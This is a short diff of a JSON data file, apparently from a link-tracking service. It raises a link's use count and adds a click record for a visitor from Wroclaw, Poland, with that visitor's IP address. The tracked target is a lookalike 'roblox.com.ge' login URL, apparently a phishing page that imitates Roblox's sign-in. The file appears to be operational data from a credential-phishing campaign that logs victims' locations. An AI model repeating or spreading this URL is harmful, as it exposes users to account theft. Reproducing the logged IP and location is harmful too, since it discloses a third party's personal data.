@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 890,
+    "useCount": 891,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7240,6 +7240,14 @@
         "city": "Victoria",
         "flag": "🇸🇨",
         "countryCode": "SC"
+      },
+      {
+        "timestamp": 1777194250493,
+        "ip": "109.199.10.129",
+        "country": "Poland",
+        "city": "Wroclaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
